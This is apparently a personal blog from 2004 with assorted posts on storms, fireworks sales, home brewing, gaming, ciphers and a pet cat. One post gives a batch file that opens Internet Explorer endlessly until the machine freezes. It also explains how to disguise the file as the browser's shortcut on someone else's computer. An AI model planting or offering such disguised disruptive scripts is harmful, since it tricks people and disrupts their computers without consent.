      This week I have been through the worst storms of my life. The kind where you sit and watch the window and outside it looks like someone is standing above your window and turning a spot light on and off every two or three seconds. Except the spotlight lights everything into day and it is accompanied by a crack and a rumble that shakes the house around you. Every time there is a lightning flash it freezes the water droplets in the air like in the Matrix Revolutions. The kind of storms where you sit and you really don't want to touch anything because you know that the next flash will strike you.  Those are the thunderstorms that have been coming around the last week.

      I saw WEIRD SCIENCE on Comedy Central today and I was listening to the blonde dude who is one of the main characters. When he gets drunk in the bar near the beginning of the movie. He sounds just like Cartman from South Park. Cartman stole this kids voice!  Oh, and Kelly LeBrock is hot.

      I made a simple batch file a while ago that can be used to mess with your friends. Just copy the following into notepad and save it as "fun.bat" or whatever you want but it has to be .bat as the file extension and under "save as type" choose "All Files". You will be able to tell if you did it right or not because after you have saved the file, when you look at the file it will look like a little window with a cog in the middle of it.  @echo off :start start iexplore.exe goto start  What that simple code does is start internet explorer over and over and over again until the computer freezes up or the user cancels the batch file.  But, someone won't just click on it just for the fun of it, or maybe they will depending if your friends are like Curious George or not. What you have to do is make this batch file look like a program that the person uses a lot(so they have more of a chance to fall to the prank). How you do this is you take the batch file and hide it somwhere on the computer where you will remember where it is and they will not find it. Next, right click on the batch file and choose "Create Shortcut" which will create a shortcut to the file. Now rename the shortcut to "Internet Explorer". Now take the shortcut and put it onto the desktop or wherever the victim usualy clicks to get to Internet Explorer. Move the old Internet Explorer icon(the one that actualy takes you to Internet Explorer to a safe place, maybe the same place you but the origional batch file). Now, right click on the shortcut to the batch file and choose "properties", when the properties window comes up choose "change icon" and then you can change the icon of the shortcut to the Internet Explorer icon.  YOUR DONE! Now you can just wait and laugh when your friend, or enemy goes to get onto the internet and their computer freezes because so many windows pop up.  Once the fun is done be a friend and put everything back to normal. Or, if they are the enemy, leave it like that and watch that little vain in the person's head pulse in anger. Dont snicker to loud or they might figure it all out.

      Was reading my new edition of Popular Science magazine for July 2004 and I Saw a couple of really interesting articles.  The first is about Jeoffrey Hillman's company named Oragenics who has patented a "swab of bacteria that when wiped across a set of teeth will alegedly grant a lifetime of protection from tooth decay."  Hillman, a dental researcher at The University of Florida(go gators!) is testing the bacteria on volunteers. Supposedly you can just get the swab of bacteria, and the dentist will tell you to go home and eat a lot of sugar to help the bacteria colonize in your mouth. The bacteria the dentist will put into your mouth does not produce the lactic acid that eats the enamel off your teeth but instead carries an antibiotic that will kill the the lactic acid producing bacteria in a normal mouth. What all this should do is keep you cavity free for the rest of your life.  One side effect the reasearcher is looking into is 'Will the bacteria spread through a kiss?'.  Now in MY logic I think to myself "What is the problem with getting the bacteria in my mouth when it will keep me cavity free and save me a dentist fee?" I guess they care because they don't want the bacteria to get loose and then no one will have to go to the dentist to get it, they can just kiss someone. I guess for some reason they want a profit for all the hard work they put into enginering the bacteria. If the bacteria does not just jump from one person to another uncontrolably, the procedure should be public within 5 or 6 years. ____  The other article was about floating a 'fake star' above large cities so that the city dwellers can have somthing to look at in the light polluted sky. It is suppose to pulse at the rate of a relaxed person's heart to sooth and intermitedly it flashes green so people know it isn't a real star. ___  You can read about these articles at  urlLink http://www.Popsci.com

      I've got to work at my Dad's friend's fireworks booth this fourth of July. It's going to be HOT just like last year. Except this year, I'll be working from 5-9pm instead of from 12am-8pm. Thank god I'll be working in the evening instead of the middle of the afternoon.   It's funny in Florida you can't sell any fireworks that shoot into the air. The only thing you can sell are sparklers, fountains, and smoke bombs, but people buy a ton of those.   The funny thing is, we have to start selling the fireworks starting on Saterday the 26th through the 4th. No one even comes into the tent the first 2 days. Then more people start to gradualy come in leading to the 4th. But the funny thing is, most of the fireworks are sold on the 4th, in the evening. You would think people would buy most before then but they don't . They all wait until the 4th to buy everything. Also, after people shoot off their stuff on the 4th they come back to buy more so we have to stay at the booth late into the evening. We don't get out of there until about midnight.  One good thing about all of this is that this year I'm suppose to be working with two cute girls.

      You can buy your beer and wine at the store and pay too much for it or, you can brew your own. Brewing your own is not super easy but anyone can do it if they read the directions.  ADVANTAGES to home brew:  1. Always higher alcohol content. 2. Cheaper than the store. 3. Fun to tell friends that you made it yourself. 4. Every beer I've tried that was home brew was just as good or better than it's commercialy sold equal. 5. Brewing in your home is just cool.  DISADVANTAGES:  1. You have to buy the equipment. 2. You have to get the bottles which might be the hardest part of all. 3. If you mess up with the sugar or if a rouge strand of bacteria gets into the batch it could ruin it. 4. If you add to much sugar or the wrong kind to the beer it will explode! (it happened to me) 5. You need somwhere in your house to make it. 6. It takes at least a month before it's ready to drink and the red wine tastes better the longer it has aged  The beer and wine is just so much less expensive when you make it yourself. You pay I guess about $8.00 for a 6-pack of beer in the store but when you make it yourself you end up paying at the most $6.00 per 6-pack. As for wine, an acceptable wine at the store is at the least around $10-$15, if you make it yourself it comes out to be about $3.00 per 750 milileter bottle.  One good thing for those of you who like to get drunk, this stuff always has a higher alcohol content than what you buy in the store. One beer = one good buzz for me.  Here are all the beers I've made so far  West Coast Pale Ale - light colored beer, tastes like an import, almost same taste as a St.Pauley Girl. Old English Stout - dark, has almost a coffee taste Toutle River Tart - has a zing to it Framboise Weisenbeir - hint of rasberry in this one Ambiorix Red Ale - red just like the name, this is the one that exploded because I used the wrong kind of sugar as primer Hard Cider - apple juice beer, no carbination but very tasty.  My favorites are probly the West Coast Pale Ale and the Hard Cider.  Here are some of the wines:  Blackberry Merlot - very dark red wine, the blackberry taste comes though very well, smooth Merlot - very warm going down, also smooth Strawberry - Actually made this from scratch and it isnt quite done yet but im sure it will be good, it is a ruby color at the moment White Zynfindel - dry and best served cold.  In fact, I like all my wine chilled in the refrigerator but that's just me. ____  You can buy all of these beers and wines in a kit, just go on ebay or on google and search for "beer/wine kit" I find it cheaper to buy them off ebay because they go for cheaper than the manufacturer most of the time.  Soon I think I'm going to try and make a batch of wine out of grape coolaid, I hear it tastes very good. I'm also planning to make a batch of rice wine. Hopefully soon I can find a cheap distiller and experiment with making different types of hard liquors.

      I've been playing on an Unreal Tournament 2003 server, I think the name is 'BallzOut' somthing, that is the name of the clan who owns the server. Anyway, they have a mod on there called BinSlayer which is where you can only use the sniper rifle but it shoots modified bullets at a very high rate(the speed of the gatling gun) and they have splash damage. The speed on the server is 170% I think and quad jump is enabled and low gravity is turned on. This particular server plays mostly maps that are rooms of the house, like the living room, the kitchen, the backyard, the bunkbed with another room attached. All the maps are very large to take advantage of the low gravity and the quad jumping.  The BinSlayer mod was created when the hunt for Bin Laden started. It's a really fast style of gameplay and takes some time to get use to. You can't stay on the ground. You must time your jumps perfectly so that you can pretty much fly across the map. To stay alive you must keep your health up with shields and get 199 health.  The BallzOut clan is very good but I'm getting a little better. Good enough to get at least one kill per round against the best of them.

      A little rant here about Windows XP CD's, if Micro$oft can spend all the money making such a shiny 3d cover for the CD why can't they PUT THE CD KEY ON THE CD!!!!!!!!  Oh, and I just want to express my sympathy to anyone who has to deal with telling the Micro$oft tech person the 50 digit code to activate their version of windows over the phone, what a pain in the ass. And then they have to tell you a 50 digit number in return to complete the activation. Just too fun for me!

           I love messing with simple ciphers. I found a cool webpage that has a lot of stuff about them and all different kinds of ciphers, much more complicated than I can decipher.   urlLink http://www.simonsingh.net/The_Black_Chamber/contents.html   That is the site and it is the best I've found so far on the subject.  One thing I thought was amazing is the Latin Square. It looks like this.  R O T A S O P E R A T E N E T A R E P O S A T O R  Once you look at it you notice that no matter how you look at it, the words can be read exactly the same except by reading diagonal. Maybe I'm just easily amused but that is cool.  'rotas opera tenet arepo sator' roughly translates into 'he who guides the plough sows the seed'.  Everything about the Latin Square can be read  urlLink here .  Here is a little bit of enciphered text that I did, it's an alphabet shift.  TBBQ WBO SVTHEVAT GUVF BHG. V QVQAG NPGHNYL GUVAX NALBAR ERNQ ZL OYBT. ZNLOR LBH PNA YRNIR ZR BAR GB QRPVCURE.  Maybe later I will post some harder blocks on enciphered text.

      My cat, Nicky, is really fat.  Just a little note: The coloring of this cat's hair is that of a cow. He looks like one of those black and white cows you see in the ice cream commerials. Anyway, the hair on his back had gotten really matted and it couldn't be combed out. So my mom desided to take him to the vet and have the hair on his  back  shaved off. Well, when my mom picked him up from the vet later in the day he was COMPLETELY SHAVED except for his head, feet, and the last three inches of his tail, they call it a lion cut....  So somehow things got mixed up and no one told the girl who was shaving my cat not to shave his whole body, just his back. Now my cat looks like one of those small dogs mixed with a cow colored pig. Poor guy.    I wish I had a camera to show you how bad he looks.

      I'll be out for the weekend to help my pap.  Will get payed for working at the fireworks booth! I calculated my pay, which at minimum wage($5.15/hr) at 45 hours should be $231.75 but that might be wrong because I'm too lazy to get up and look at the sheet that I wrote the correct pay on as it is in the other room. But it's about that.  For some reason I bet that I won't get pawed that much because last year I kinda got ripped off. Because the guy is my Dad's friend and all I really don't mind.
